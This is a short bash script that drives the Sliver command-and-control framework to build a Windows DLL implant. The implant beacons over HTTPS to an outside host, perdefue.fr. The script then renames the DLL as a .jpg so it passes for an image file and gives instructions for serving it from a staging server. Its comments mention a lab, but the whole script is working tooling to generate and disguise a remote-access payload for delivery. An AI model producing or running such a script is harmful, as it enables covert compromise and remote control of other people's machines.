#!/usr/bin/env bash
# Generate the foothold module and masquerade it as an image file.
# Run on the C2 host; the generated DLL is served by the lab staging server.
set -euo pipefail

NAME="${1:-compareforfor}"
OUT="${2:-.}"

sliver-client console <<EOF
generate --name "${NAME}" --os windows --arch amd64 \
  --format shared --exports DllRegisterServer \
  --https perdefue.fr:443 --save "${OUT}"
EOF

src="${OUT}/${NAME}.dll"
dst="${OUT}/compareForfor.jpg"
mv "${src}" "${dst}"

printf 'sha256  %s\n' "$(sha256sum "${dst}" | cut -d' ' -f1)"
printf 'size    %s\n' "$(stat -c%s "${dst}")"
printf '\nServe %s as /compareForfor.jpg from the staging root.\n' "${dst}"
